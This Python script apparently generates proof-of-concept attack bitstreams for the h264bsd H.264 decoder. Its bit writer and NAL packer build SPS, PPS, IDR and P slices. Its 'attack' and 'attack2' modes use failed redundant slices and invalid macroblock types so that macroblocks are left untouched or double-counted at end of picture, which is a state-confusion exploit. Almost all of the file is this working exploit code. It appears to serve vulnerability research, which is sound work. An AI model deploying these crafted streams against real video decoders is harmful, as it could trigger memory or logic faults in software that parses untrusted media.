"""Craft a tiny baseline stream (redundant_pic_cnt_present=1, deblocking control=1) that drives h264bsd into
IsEndOfPicture with two adjacent untouched MBs (double counting via failed redundant slices).
host/vectors: python3 gen.py attack > attack.h264; python3 gen.py attack2 > attack2.h264 (6x2 MBs, I_PCM IDR)."""
import sys

class BW:
    def __init__(s): s.bits = []
    def u(s, n, v):
        for i in range(n - 1, -1, -1): s.bits.append((v >> i) & 1)
    def ue(s, v):
        v += 1; n = v.bit_length()
        s.u(n - 1, 0); s.u(n, v)
    def se(s, v): s.ue(2 * v - 1 if v > 0 else -2 * v)
    def align0(s):
        while len(s.bits) % 8: s.bits.append(0)
    def trailing(s):
        s.bits.append(1); s.align0()
    def bytes(s):
        assert len(s.bits) % 8 == 0
        return bytes(int(''.join(map(str, s.bits[i:i + 8])), 2) for i in range(0, len(s.bits), 8))

def nal(ref_idc, typ, rbsp):
    out = bytearray(); z = 0
    for b in rbsp:
        if z >= 2 and b <= 3: out.append(3); z = 0
        out.append(b); z = z + 1 if b == 0 else 0
    return b'\x00\x00\x00\x01' + bytes([(ref_idc << 5) | typ]) + bytes(out)

W, H = int(sys.argv[2]) if len(sys.argv) > 2 else 6, 2
N = W * H
QP = 36

def sps():
    b = BW(); b.u(8, 66); b.u(8, 0); b.u(8, 30); b.ue(0)
    b.ue(0)            # log2_max_frame_num_minus4 -> 4 bits
    b.ue(2)            # poc type 2
    b.ue(1)            # num_ref_frames
    b.u(1, 0)          # gaps
    b.ue(W - 1); b.ue(H - 1)
    b.u(1, 1); b.u(1, 1); b.u(1, 0); b.u(1, 0)
    b.trailing(); return nal(3, 7, b.bytes())

def pps(redundant=1):
    b = BW(); b.ue(0); b.ue(0); b.u(1, 0); b.u(1, 0); b.ue(0)
    b.ue(0); b.ue(0); b.u(1, 0); b.u(2, 0)
    b.se(QP - 26); b.se(0); b.se(0)
    b.u(1, 1)          # deblocking_filter_control_present
    b.u(1, 0)          # constrained intra
    b.u(1, redundant)  # redundant_pic_cnt_present
    b.trailing(); return nal(3, 8, b.bytes())

def hdr(b, first, stype, fn, idr, rpc, idc, redundant=1):
    b.ue(first); b.ue(stype); b.ue(0); b.u(4, fn)
    if idr: b.ue(0)
    if redundant: b.ue(rpc)
    if stype == 0:
        b.u(1, 0)      # num_ref_idx_active_override
        b.u(1, 0)      # ref_pic_list_reordering_flag_l0
    if idr: b.u(1, 0); b.u(1, 0)
    else: b.u(1, 0)    # adaptive_ref_pic_marking_mode_flag
    b.se(0)            # slice_qp_delta
    b.ue(idc)
    if idc != 1: b.se(0); b.se(0)

def idr_slice(luma, redundant=1):
    b = BW(); hdr(b, 0, 2, 0, True, 0, 0, redundant)
    for m in range(N):
        b.ue(25); b.align0()
        for _ in range(256): b.u(8, luma[m])
        for _ in range(128): b.u(8, 128)
    b.trailing(); return nal(3, 5, b.bytes())

def p_slice(first, fn, skip, rpc=0, idc=0, bad_after=False, redundant=1):
    b = BW(); hdr(b, first, 0, fn, False, rpc, idc, redundant); b.ue(skip)
    if bad_after: b.ue(31)             # invalid P mb_type -> macroblock_layer error
    b.trailing(); return nal(2, 1, b.bytes())

mode = sys.argv[1]
luma = [100 if (m % W) < 3 else 110 for m in range(N)]   # step between MB 2 and MB 3 of each row
s = sps() + pps() + idr_slice(luma)
s += p_slice(0, 1, N)                                     # frame 1: copy of the IDR
# frame 2 (picture n-1): MB 2 missing -> concealed (I_4x4, qp 40, idc 0); MBs 3.. decoded with idc 2
s += p_slice(0, 2, 2, idc=2) + p_slice(3, 2, N - 3, idc=2)
if mode == 'attack':
    # frame 3 (picture n): P1 [0,2) | R1 fails at MB 1 | R2 fails at MB 0 | P2 [0,2) + P3 [4,N): count N, MBs 2,3 untouched
    s += p_slice(0, 3, 2)
    s += p_slice(0, 3, 1, rpc=1, bad_after=True)
    s += p_slice(0, 3, 1000, rpc=1)
    s += p_slice(0, 3, 2) + p_slice(4, 3, N - 4)
elif mode == 'attack2':
    # frame 3: P0 [0,2) P1 [3,N) primary; R (idc 2) [2..] re-touches MB 3 (decoded 2) and fails at MB 4:
    # MB 2 concealed with R's id, MB 3 survives with R's id and idc 2 -> its left edge compares R == R
    s += p_slice(0, 3, 2) + p_slice(3, 3, N - 3) + p_slice(2, 3, 2, rpc=1, idc=2, bad_after=True)
elif mode == 'plain':
    s += p_slice(0, 3, N)
s += p_slice(0, 4, N)                                     # frame 4
sys.stdout.buffer.write(s)
